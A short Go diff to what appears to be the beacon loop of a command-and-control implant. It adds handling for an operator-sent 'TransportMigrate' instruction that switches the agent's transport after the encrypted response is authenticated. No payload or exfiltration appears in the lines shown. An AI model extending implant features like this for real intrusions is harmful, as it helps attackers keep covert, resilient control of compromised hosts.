@@ -428,6 +428,14 @@ func doBeacon() {
 		// advertises this inside the AEAD-authenticated response, so a MITM
 		// cannot turn compression on by rewriting a cleartext field.
 		peerCanInflate.Store(resp.Compression == "gzip")
+		// Explicit one-shot transport switch from the operator. Applied after
+		// the response is authenticated and decrypted; it must not invalidate
+		// the session or advance the sequence.
+		if resp.TransportMigrate != nil {
+			if err := applyTransportMigration(resp.TransportMigrate); err != nil && Debug {
+				log.Printf("[!] transport migration refused: %v", err)
+			}
+		}
 		// Online config refresh: an encrypted response may carry the operator's
 		// live network config (changed or periodic). It is secret-bound and the
 		// enclosing frame is AEAD-authenticated, so applying it is safe. This
